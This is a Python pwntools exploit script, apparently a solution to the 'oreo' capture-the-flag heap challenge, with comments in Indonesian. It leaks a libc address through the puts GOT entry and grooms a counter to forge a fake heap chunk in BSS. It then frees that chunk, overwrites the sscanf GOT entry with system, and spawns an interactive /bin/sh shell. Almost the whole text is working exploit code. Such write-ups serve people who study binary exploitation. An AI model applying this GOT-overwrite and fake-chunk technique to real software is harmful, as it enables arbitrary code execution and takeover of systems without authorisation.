from pwn import *

elf = ELF('./oreo')
libc = ELF('./libc-2.24.so')
p = process('./oreo')

def add(name, desc):
    p.sendline(b'1')
    p.sendline(name)
    p.sendline(desc)

def show():
    p.sendline(b'2')

def order():
    p.sendline(b'3')

def message(msg):
    p.sendline(b'4')
    p.sendline(msg)

# Leak libc
puts_got = elf.got['puts']
add(b'A' * 27 + p32(puts_got), b'dummy')
show()

p.recvuntil(b'===================================\n')
p.recvuntil(b'===================================\n')
p.recvuntil(b'Description: ')

puts_leak = u32(p.recv(4))
print(f"Leak puts -> {hex(puts_leak)}")

libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
print(f"libc base -> {hex(libc_base)}")
print(f"system addr -> {hex(system_addr)}")

# Grooming riflesCount jadi 0x41 (65)
# Add 1 di awal buat leak, jadi sisa 63 kali iterasi biar totalnya 64
for _ in range(63):
    add(b'A' * 27 + p32(0), b'dummy')
    order()

# Add rifle ke-65 buat genapin counter ke 0x41 sekalian tembak fake chunk
fake_chunk = 0x0804a2a8
add(b'A' * 27 + p32(fake_chunk), b'dummy')

# Fix memory layout BSS pake leaveMessage
msg_payload = b'A' * 28 + p32(0) + p32(0) + p32(0x21)
message(msg_payload)

# Eksekusi free() ke fake chunk
order()

# Allocate ulang biar chunk dapet di tempat message_storage_ptr
sscanf_got = elf.got['__isoc99_sscanf']
add(b'dummy', p32(sscanf_got))

# Timpa sscanf GOT pake alamat system
message(p32(system_addr))

# Own it
p.sendline(b'/bin/sh')

p.interactive()